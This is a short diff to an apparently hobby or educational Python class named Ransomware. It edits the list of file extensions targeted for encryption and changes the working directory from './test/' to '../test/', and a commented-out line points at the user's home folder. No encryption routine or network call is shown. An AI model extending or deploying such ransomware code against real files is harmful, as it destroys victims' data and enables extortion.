@@ -19,7 +19,7 @@ class Ransomware:
 
     def __init__(self, key=None):
         self.cryptor = None
-        self.file_ext_targets = ['txt','png','pdf','exe','zip','rar','jni','pok','etf','uhg','thu','jpg','pjp']
+        self.file_ext_targets = ['txt','png','pdf','exe','zip','rar','jni','pok','eft','uhg','thu','jpg','pjp']
 
 
     def generate_key(self):
@@ -99,7 +99,7 @@ class Ransomware:
 
 if __name__ == '__main__':
     # sys_root = expanduser('~')
-    local_root = './test/'
+    local_root = '../test/'
 
     Ransom = Ransomware()
     flag=False
